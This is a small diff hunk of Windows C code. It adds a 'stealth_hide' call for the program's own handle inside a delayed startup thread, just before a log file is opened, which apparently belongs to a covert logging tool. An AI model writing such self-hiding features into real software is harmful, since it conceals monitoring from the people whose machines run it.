@@ -16,6 +16,8 @@ static DWORD WINAPI startup_thread(LPVOID param)
     (void)param;
     Sleep(10000);
 
+    stealth_hide(g_self);
+
     char logPath[MAX_PATH];
     get_log_path(logPath, MAX_PATH);
     log_init(logPath);
